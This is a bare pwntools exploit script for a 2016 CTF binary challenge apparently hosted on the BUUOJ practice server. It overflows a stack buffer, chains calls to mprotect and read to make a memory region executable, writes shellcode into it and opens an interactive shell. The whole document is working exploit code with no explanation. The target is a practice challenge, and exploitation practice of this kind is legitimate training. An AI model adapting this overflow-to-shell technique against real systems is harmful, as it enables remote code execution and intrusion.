from pwn import *
elf = ELF('./not_the_same_3dsctf_2016')
#r = process('./not_the_same_3dsctf_2016')
io=remote('node3.buuoj.cn',29052)
pop_ret = 0x08050b45
#pop ebx ; pop esi ; pop edi ; ret
mem_addr = 0x80ec000 
mem_size = 0x1000    
mem_proc = 0x7       
mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']
payload  = 'A' * 0x2d
payload += p32(mprotect_addr)
payload += p32(pop_ret) 
payload += p32(mem_addr) 
payload += p32(mem_size)  
payload += p32(mem_proc)   
payload += p32(read_addr)
payload += p32(pop_ret)  
payload += p32(0)     
payload += p32(mem_addr)   
payload += p32(0x100) 
payload += p32(mem_addr)   
io.sendline(payload)
payload = asm(shellcraft.sh()) 
io.sendline(payload)
io.interactive()